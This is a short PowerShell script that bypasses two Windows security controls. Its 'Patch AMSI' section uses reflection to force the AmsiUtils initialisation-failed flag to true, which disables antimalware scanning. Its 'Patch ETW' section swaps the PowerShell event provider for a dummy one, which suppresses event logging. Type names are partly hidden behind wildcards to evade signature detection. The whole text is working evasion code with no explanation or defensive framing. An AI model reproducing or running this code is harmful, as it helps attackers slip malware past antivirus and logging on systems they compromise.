# Patch AMSI
Foreach($au in [Ref].Assembly.GetTypes()) { if ($au.Name -like "*iUtils") { break; };};
Foreach($aif in $au.GetFields('NonPublic,Static')) { if ($aif.Name -like "*Failed") { break; };};
$aif.SetValue($null,$true);

# Patch ETW
Foreach($pselg in [Ref].Assembly.GetTypes()) { if ($pselg.Name -like "P*gProvider") { break; };};
Foreach($ep in $pselg.GetFields('NonPublic,Static')) { if ($ep.Name -like "*Provider") { break; };};
$ep.SetValue($null,(New-Object System.Diagnostics.Eventing.EventProvider -ArgumentList @([Guid]::NewGuid())));
